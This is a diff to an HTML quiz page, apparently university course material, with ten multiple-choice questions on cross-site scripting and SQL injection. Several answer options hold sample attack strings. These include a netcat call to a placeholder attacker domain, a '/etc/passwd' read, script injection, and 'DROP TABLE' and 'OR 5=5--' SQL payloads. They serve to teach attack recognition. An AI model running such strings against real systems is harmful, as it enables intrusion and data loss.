@@ -16,29 +16,8 @@
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
 <link rel="stylesheet" type="text/css" href="assets/style.css" />
 <link rel="stylesheet" type="text/css" href="assets/bootstrap-icons.css">
-<style type="text/css">a.ntnu-button {
-    font: 600 14px "Source Sans Pro", Georgia, serif;
-    background: #fff;
-    color: #00509e;
-    border: 1px solid #00509e;
-    border-color: #00509e !important
-    border-style: solid !important;
-    border-radius: 10rem;
-    display: inline-block;
-    padding: 5px 15px;
-    height: auto;
-    font-weight: bold;
-    line-height: 1.5em;
-    text-align: center;
-    vertical-align: top;
-    cursor: pointer;
-    text-decoration: none
-}
-
-a.ntnu-button:hover {
-    background: #00509e;
-    color: #fff;
-    text-decoration: none
+<style type="text/css">div.factbox {
+  width:250px; float: right; margin: 0 15px 15px 15px; padding:15px; background: lightblue
 }
 div.check ul,
 div.check ul li {
@@ -160,16 +139,12 @@ div.rat ol {
 
 .steps li {
   margin: 0 0 10px 0;
-  xline-height: 40px;
   min-height: 40px
 }
 
 .steps li:before {
   content: counter(li);
   counter-increment: li;
-  xborder: 2px solid #1481b8;
-  xcolor: white;
-  xbackground-color: #1481b8;
   border: 2px solid #868279;
   color: #868279;
   background-color: none;
@@ -183,23 +158,9 @@ div.rat ol {
   width: 30px;
   height: 30px;
   position: relative;
-  margin-right:-10px;
-  margin-left:-20px;
-  margin-top:-20px;
-  margin-bottom:-20px;
-}
-div.task p {
-padding: 10px;
-background-color: #D6E5F0;
-border-radius: 5px;
-border-left: 6px solid #1481b8 
+  margin: -20px -10px -20px -20px
 }
 
-div.task p::before { 
-content: "Task: ";
-font-weight: bold;
-display: inline;
-}
 div.tip p {
   padding: 10px;
   background-color: #d9eaf2;
@@ -373,86 +334,97 @@ display: inline;
 
 <div class="page">
     <section class="content">
-<h2 id="question-1">Question 1</h2>
+<h2>Question 1</h2>
+
 <div class="rat"><p>Which language is used for Cross Site Scripting?</p>
-<ol type="1">
+<ol>
 <li>Java</li>
 <li>Http</li>
 <li>Php</li>
 <li>Javascript</li>
 </ol>
-<h2 id="question-2">Question 2</h2></div>
+<h2>Question 2</h2>
+</div>
 <div class="rat"><p>Which attack type is not possible with Cross Site Scripting</p>
-<ol type="1">
+<ol>
 <li>Overwriting the webpage content on the server side</li>
 <li>Overwriting the webpage content on the client side</li>
 <li>Sending attacker controlled requests to the server</li>
 <li>Stealing sessions of logged in users</li>
 </ol>
-<h2 id="question-3">Question 3</h2></div>
+<h2>Question 3</h2>
+</div>
 <div class="rat"><p>Which of the following looks like an XSS attack?</p>
-<ol type="1">
+<ol>
 <li><code>http://innsida.ntnu.no/blackboard|nc xss.evildomain.com 8080</code></li>
 <li><code>http://innsida.ntnu.no/blackboard&lt;script&gt;document.location='http://innsida.ntnuu.no/blackboard'&lt;/script&gt;</code></li>
 <li><code>http://innsida.ntnu.no/blackboard&lt;?php print('http://innsida.ntnuu.no/blackboard') ?&gt;</code></li>
 <li><code>http://innsida.ntnu.no/blackboard|cat /etc/passwd</code></li>
 </ol>
-<h2 id="question-4">Question 4</h2></div>
+<h2>Question 4</h2>
+</div>
 <div class="rat"><p>Which of these does not prevent Cross Site Scripting?</p>
-<ol type="1">
+<ol>
 <li>encode all output coming from input data</li>
 <li>disable client side scripts</li>
 <li>filtering for the <code>&lt;script&gt;</code> keyword with firewall</li>
 <li>validate all user input on the server side</li>
 </ol>
-<h2 id="question-5">Question 5</h2></div>
+<h2>Question 5</h2>
+</div>
 <div class="rat"><p>Which SQL statement can be used to retrieve data from the database?</p>
-<ol type="1">
+<ol>
 <li>select</li>
 <li>update</li>
 <li>insert</li>
 <li>drop</li>
 </ol>
-<h2 id="question-6">Question 6</h2></div>
+<h2>Question 6</h2>
+</div>
 <div class="rat"><p>What is the meaning of * in an SQL query?</p>
-<ol type="1">
+<ol>
 <li>all columns</li>
 <li>all rows</li>
 <li>all tables</li>
 <li><code>*</code> is not used in SQL</li>
 </ol>
-<h2 id="question-7">Question 7</h2></div>
+<h2>Question 7</h2>
+</div>
 <div class="rat"><p>Which SQL keyword is used to filter the result?</p>
-<ol type="1">
+<ol>
 <li>Union</li>
 <li>Where</li>
 <li>Filter</li>
 <li>If</li>
 </ol>
-<h2 id="question-8">Question 8</h2></div>
+<h2>Question 8</h2>
+</div>
 <div class="rat"><p>What is manipulated with SQL injection?</p>
-<ol type="1">
+<ol>
 <li>the browser sandboxing</li>
 <li>the database query</li>
 <li>the http protocol</li>
 <li>the javascript</li>
 </ol>
-<h2 id="question-9">Question 9</h2></div>
+<h2>Question 9</h2>
+</div>
 <div class="rat"><p>What is possible with SQL injection?</p>
-<ol type="1">
+<ol>
 <li>only overwriting data in the database</li>
 <li>only login bypass</li>
 <li>both reading data and overwriting data in the database</li>
 <li>only reading data from the database</li>
 </ol>
-<h2 id="question-10">Question 10</h2></div>
+<h2>Question 10</h2>
+</div>
 <div class="rat"><p>Which of the following link looks like an SQL injection attack attempt?</p>
-<ol type="1">
+<ol>
 <li><code>http://innsida.ntnu.no/blackboard?teacher=&lt;script&gt;alert('SQL injection')&lt;/script&gt;</code></li>
 <li><code>http://innsida.ntnu.no/blackboard?teacher=Drop table students;#</code></li>
 <li><code>http://innsida.ntnu.no/blackboard?teacher=sqlmap --wizard</code></li>
 <li><code>http://innsida.ntnu.no/blackboard?teacher=Laszlo'+OR+5=5--</code></li>
-</ol></div>
+</ol>
+</div>
     </section>
 </div>
 
